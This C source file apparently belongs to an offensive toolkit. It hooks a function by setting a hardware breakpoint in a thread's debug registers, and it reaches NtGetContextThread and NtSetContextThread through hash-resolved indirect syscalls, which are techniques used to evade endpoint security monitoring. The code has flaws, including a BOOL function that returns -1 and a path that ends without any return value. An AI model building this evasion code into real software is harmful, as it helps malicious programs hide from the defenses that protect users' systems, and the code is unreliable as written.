#include "hwbp.h"
#include "exception_handler.h"
#include "indirect_syscall.h"

#include "debug.h"

NTAPI_FUNC _G_NTFUNC;

BOOL HWBP(HANDLE hThread, DWORD64 AddrFunctionToHook, BOOL SetHWBP) {

	BOOL res = FALSE;
	NTSTATUS STATUS = NULL;

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;

	if (!ObtainSyscall(NTGETCONTEXTTHREAD_HASH, &_G_NTFUNC.NtGetContextThread)) {
		return -1;
	}
	SET_SYSCALL(_G_NTFUNC.NtGetContextThread);
	if ((STATUS = RunSyscall(hThread, &ctx)) != 0x00) {
#ifdef DEBUG
		PRINTA("[-] Syscall failed with status: 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	switch (SetHWBP) {
	case TRUE:
#ifdef DEBUG
		PRINTA("[+] HWBP Set ! \n");
#endif
		ctx.Dr0 = AddrFunctionToHook;
		ctx.Dr7 |= (1 << 0);	// Break at DR0
		ctx.Dr7 &= ~(1 << 16);	// Break on execution
		ctx.Dr7 &= ~(1 << 17);
		res = TRUE;
		break;

	case FALSE:
#ifdef DEBUG
		PRINTA("[-] Unset HWBP !\n");
#endif

		ctx.Dr0 = NULL;			// Clear DR0
		ctx.Dr7 &= ~(1 << 0);	// Clear DR7
		res = FALSE;
		break;
	}

	// Set the context flag to work with debug registers
	// Then write the new context of the thread
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!ObtainSyscall(NTSETCONTEXTTHREAD_HASH, &_G_NTFUNC.NtSetContextThread)) {
		return -1;
	}
	SET_SYSCALL(_G_NTFUNC.NtSetContextThread);
	if ((STATUS = RunSyscall(hThread, &ctx)) != 0x00) {
#ifdef DEBUG
		PRINTA("[-] Syscall failed with status: 0x%0.8X\n", STATUS);
#endif
		return -1;
	}
}